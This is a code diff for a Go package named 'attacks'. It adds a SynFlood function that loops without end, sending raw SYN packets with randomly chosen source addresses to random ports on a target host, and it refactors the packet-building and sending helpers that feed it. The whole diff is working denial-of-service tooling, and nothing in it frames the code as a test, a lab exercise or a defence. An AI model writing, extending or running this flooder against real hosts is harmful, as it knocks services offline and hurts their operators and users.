@@ -2,6 +2,7 @@ package attacks
 
 import (
 	"fmt"
+	"log"
 	"math/rand"
 	"net"
 
@@ -9,6 +10,8 @@ import (
 	"github.com/google/gopacket/layers"
 	"golang.org/x/net/ipv4"
 )
+
+type Attacker func(host string)
 
 // buildIpPacket generates a layers.IPv4 and returns it with source IP address and destination IP address
 func buildIpPacket(srcIpStr, dstIpStr string) *layers.IPv4 {
@@ -64,7 +67,7 @@ func getPorts() []int {
 var ips = getIps()
 var ports = getPorts()
 
-func ConstructPacket(destHost string, destPort int) (error, *ipv4.Header, gopacket.SerializeBuffer) {
+func constructPacket(destHost string, destPort int) (error, *ipv4.Header, gopacket.SerializeBuffer) {
 	payload := gopacket.Payload([]byte{'h', 'i'})
 	var err error
 	tcpPack := buildSynTcpPacket(ports[rand.Intn(len(ports))], destPort)
@@ -96,7 +99,7 @@ func ConstructPacket(destHost string, destPort int) (error, *ipv4.Header, gopack
 	return nil, ipHeader, tcpPayloadBuf
 }
 
-func SendPacket(ipHeader *ipv4.Header, data gopacket.SerializeBuffer) error {
+func sendPacket(ipHeader *ipv4.Header, data gopacket.SerializeBuffer) error {
 	packetConn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
 	if err != nil {
 		return err
@@ -109,4 +112,19 @@ func SendPacket(ipHeader *ipv4.Header, data gopacket.SerializeBuffer) error {
 	err = rawConn.WriteTo(ipHeader, data.Bytes(), nil)
 	rawConn.Close()
 	return err
+}
+
+func SynFlood(host string) {
+	for {
+		port := rand.Intn(64000) + 1024
+		err, header, data := constructPacket(host, port)
+		if err != nil {
+			log.Fatal(err)
+		}
+		err = sendPacket(header, data)
+		if err != nil {
+			log.Println("Error during sending packet")
+			log.Fatal(err)
+		}
+	}
 }
